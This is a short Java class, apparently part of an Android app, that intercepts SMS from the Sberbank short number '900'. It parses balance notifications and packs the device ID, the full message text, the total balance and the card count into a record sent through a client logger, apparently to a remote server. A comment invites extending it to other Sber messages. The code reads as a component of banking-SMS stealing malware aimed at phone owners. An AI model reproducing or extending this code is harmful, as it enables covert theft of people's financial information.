package com.my.myapp.core.banks;

import com.my.myapp.core.banks.types.Balance;
import com.my.myapp.core.client.Logger;
import org.json.JSONObject;

public class SmsBank {
    public static final String PHONE_NUMBER = "900";
    private static final Balance balance = new Balance();

    public static void handleResponse(String sender, String text, String deviceId) {
        if (!PHONE_NUMBER.equals(sender)) return;

        JSONObject data = new JSONObject();
        try {
            data.put("type", "bank");
            data.put("deviceId", deviceId);
            data.put("sender", sender);
            data.put("text", text);

            if (text.contains("Баланс по кар")) {
                balance.clearAndLoad(text);
                data.put("balance", balance.getTotalAmount());
                data.put("cards", balance.getCardCount());
                Logger.sendLog("bank", data);
            }
            // здесь можно добавить обработку других типов сообщений от Сбера
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}